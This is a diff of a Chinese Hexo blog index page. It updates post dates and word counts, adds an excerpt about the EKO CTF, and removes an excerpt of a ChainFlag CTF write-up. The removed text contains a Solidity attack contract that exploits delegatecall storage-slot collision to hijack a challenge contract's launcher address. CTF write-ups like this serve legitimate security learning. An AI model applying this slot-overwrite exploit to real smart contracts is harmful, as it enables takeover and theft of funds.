@@ -197,10 +197,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-03-19 20:40:06 / 修改时间：20:40:46" itemprop="dateCreated datePublished" datetime="2023-03-19T20:40:06+08:00">2023-03-19</time>
+              <time title="创建时间：2023-03-19 20:40:06" itemprop="dateCreated datePublished" datetime="2023-03-19T20:40:06+08:00">2023-03-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-20 20:25:02" itemprop="dateModified" datetime="2023-03-20T20:25:02+08:00">2023-03-20</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -217,14 +223,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>7.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -236,7 +242,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <p>全新的CTF系列—–<a target="_blank" rel="noopener" href="https://www.ctfprotocol.com/tracks/eko2022">EKO</a>，这应该是ethernaut组织开发出的CTF竞赛</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/19/EKO-CTF-%E4%BA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -381,7 +395,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-19 20:29:53" itemprop="dateModified" datetime="2023-03-19T20:29:53+08:00">2023-03-19</time>
+                <time title="修改时间：2023-03-20 20:25:40" itemprop="dateModified" datetime="2023-03-20T20:25:40+08:00">2023-03-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -419,23 +433,14 @@
 
       
           <p><a target="_blank" rel="noopener" href="https://chainflag.org/challenges">ChainFlag靶场</a>WP</p>
-<h1 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h1><h2 id="CounterStrike"><a href="#CounterStrike" class="headerlink" title="CounterStrike"></a>CounterStrike</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20230106215919560.png" alt="image-20230106215919560"></p>
-<p>题目需要我们把<code>power_state</code>变为true.</p>
-<p>题目给了三个合约，但其中两个都是功能合约，这里不细说，主要还是<code>EasyBomb</code>合约为主。</p>
-<p>首先合约中并不存在直接改变其值的语句，唯一存在的可用函数为<code>setCountDownTimer</code>.</p>
-<p><img src="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20230106220122279.png" alt="image-20230106220122279"></p>
-<p>在调用以上函数需要首先通过<code>isOwner</code>和<code>notExplodeYet</code>修饰符。</p>
-<p><img src="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20230106220431382.png" alt="image-20230106220431382"></p>
-<p><code>isOwner</code>需要我们,在调用合约是的calldata的第六十八字节往后为合约中的密码，并且需要在构造函数中进行调用。</p>
-<p><img src="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20230109184628235.png" alt="image-20230109184628235"></p>
-<p><code>notExplodeYet</code>则会判断当前区块是否大于<code>launcher</code>中的<code>deadline</code>,并赋值状态变量为true。</p>
-<p><img src="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20230109185830780.png" alt="image-20230109185830780"></p>
-<p>随后<code>setCountDownTimer</code>函数会使用<code>delegatecall</code>来调用<code>Launcher</code>中的<code>setdeadline</code>函数，而<code>delegatecall</code>是根据存在插槽来进行变量的修改，也就是会改变当前合约slot0中存放的值，也就是<code>hasExplode</code>和<code>launcher_address</code>。所以我们只要构造好data,成功将<code>launcher_address</code>修改为我们自己的攻击合约地址即可。</p>
-<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    EasyBomb defuse;</span><br><span class="line">    constructor(address _addr)public&#123;</span><br><span class="line">        defuse = EasyBomb(_addr);</span><br><span class="line">        address(defuse).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,</span><br><span class="line">         0x0000000000000000000000B302F922B24420f3A3048ddDC4E2761CE37Ea09800, </span><br><span class="line">         0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a));</span><br><span class="line">         address(defuse).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,</span><br><span class="line">         0x0000000000000000000000B302F922B24420f3A3048ddDC4E2761CE37Ea09800, </span><br><span class="line">         0x50ff0f52db8fd58abf094db7ef8e56acd1e5250dcb9dbd6e5a5b3f2b67d00e3a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attackLauncher&#123;</span><br><span class="line">    bool public Explode = false;</span><br><span class="line">    address public launcherAddress;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    uint256 public deadline ;</span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        deadline = block.number+100000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setdeadline(uint256 _deadline) public &#123;</span><br><span class="line">        deadline = 0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>将call中的第四到第三十六个字节设定为<code>attackLauncher</code>的地址,后面的三十二个字节设定为题目中的密码，最后在改变地址后再次调用<code>setCountDownTimer</code>函数即可完成攻击将<code>power_state</code>设定为0.</p>
-<h2 id="SafeDelegatecall"><a href="#SafeDelegatecall" class="headerlink" title="SafeDelegatecall"></a>SafeDelegatecall</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><h1 id="bad-randomness"><a href="#bad-randomness" class="headerlink" title="bad randomness"></a>bad randomness</h1><h2 id="EOSGame"><a href="#EOSGame" class="headerlink" title="EOSGame"></a>EOSGame</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><h1 id="Airdrop-hunting"><a href="#Airdrop-hunting" class="headerlink" title="Airdrop hunting"></a>Airdrop hunting</h1><h2 id="Coinflip"><a href="#Coinflip" class="headerlink" title="Coinflip"></a>Coinflip</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><h3 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h3><h2 id="Fake3d"><a href="#Fake3d" class="headerlink" title="Fake3d"></a>Fake3d</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h3 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h3><h2 id="babybet"><a href="#babybet" class="headerlink" title="babybet"></a>babybet</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><h3 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1227,12 +1232,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">238k</span>
+    <span title="站点总字数">245k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:37</span>
+    <span title="站点阅读时长">3:43</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
